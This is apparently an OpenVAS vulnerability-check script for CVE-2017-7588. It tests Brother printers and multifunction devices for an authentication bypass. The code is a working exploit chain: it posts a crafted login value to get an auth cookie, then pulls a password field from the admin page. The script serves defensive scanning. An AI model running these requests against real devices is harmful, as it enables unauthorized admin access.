###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_brother_mfc_bypass_vuln.nasl 7613 2017-11-01 14:51:05Z asteins $
#
# Brother Devices - Authentication Bypass / Password Change Exploit
#
# Authors:
# Tameem Eissa <tameem.eissa@greenbone.net>
#
# Copyright:
# Copyright (C) 2017 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.107152");
  script_version("$Revision: 7613 $");
  script_tag(name:"last_modification", value:"$Date: 2017-11-01 15:51:05 +0100 (Wed, 01 Nov 2017) $");
  script_tag(name:"creation_date", value:"2017-04-24 13:30:11 +0200 (Mon, 24 Apr 2017)");
  script_cve_id("CVE-2017-7588");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");

  script_name("Brother Devices - Authentication Bypass / Password Change Exploit");

  script_tag(name: "summary", value: "Most of Brother devices web authorization can be bypassed through trivial bug in login proccess.");

  script_tag(name: "vuldetect", value: "Send the crafted HTTP POST request and check if it possible get cookies info.");

  script_tag(name: "insight", value: "Authorization cookie information can be used to crack current password from exported cookie.");

  script_tag(name: "impact" , value: "Successful exploitation will allow attackers to login as admin.");

  script_tag(name: "affected", value: "MFC-J6973CDW, MFC-J4420DW, MFC-8710DW, MFC-J4620DW, MFC-L8850CDW, MFC-J3720, MFC-J6520DW, MFC-L2740DW,
  MFC-J5910DW, ,MFC-J6920DW, MFC-L2700DW, MFC-9130CW, MFC-9330CDW, MFC-9340CDW, MFC-J5620DW, MFC-J6720DW, MFC-L8600CDW, MFC-L9550CDW, MFC-L2720DW,
  DCP-L2540DW, DCP-L2520DW, HL-3140CW, HL-3170CDW, HL-3180CDW, HL-L8350CDW, HL-L2380DW, ADS-2500W, ADS-1000W, ADS-1500W");

  script_tag(name: "solution", value: "No solution or patch was made available as of 01st November, 2017.
  As a workaround, minimize the network access to Brother MFC device or disable HTTP(S) interface.");

  script_xref(name: "URL" , value: "https://www.exploit-db.com/exploits/41863/");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2017 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"Workaround");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port( default:80 );

#retrieving Logvalue
url = "/general/status.html";

req = http_get_req( port:port, url:url, add_headers:make_array( 'Accept', '*/*', 'Content-Type', 'application/x-www-form-urlencoded' ) );
recv = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );

if( recv !~ "^HTTP/1\.[0-1] 200" || "Please configure the password" >< recv ) exit( 0 );

Logvalue = eregmatch( pattern:'LogBox" name="([A-Za-z0-9]*)"', string:recv );
Logvalue = Logvalue[1];

#retrieving cookies
data = Logvalue + "=xyz&loginurl=/general/status.html";

req = http_post_req( port:port, url:url, data:data, add_headers: make_array( 'Accept', '*/*', 'Content-Type', 'application/x-www-form-urlencoded' ) );
recv = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );

if( ( recv =~ "^HTTP/1\.[0-1] 301" || recv =~ "^HTTP/1\.[0-1] 200") && ( "<title>Brother" >< recv ) ) {
  cookie = eregmatch( pattern:"Set-Cookie: AuthCookie=([0-9a-z]*);", string:recv );
  cookie = cookie[1];
}

#retrieving password
url = "/admin/password.html";

req = http_get_req( port:port, url:url, add_headers:make_array( 'Accept', '*/*', 'Cookie', 'AuthCookie=' + cookie ) );
recv = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );

if( recv =~ "^HTTP/1\.[0-1] 200" && "<title>Brother" >< recv ) {

  password = eregmatch( pattern:'type="password" class="password" id="([A-Za-z0-9]*)" name="([A-Za-z0-9]*)"', string:recv );
  if( ! isnull( password[ 2 ] ) ) {
    report = "The following password could be retrieved and which could be used to bypass authentication: " + password[2];
    security_message( port:port, data:report );
    exit( 0 );
  }
}

exit( 99 );
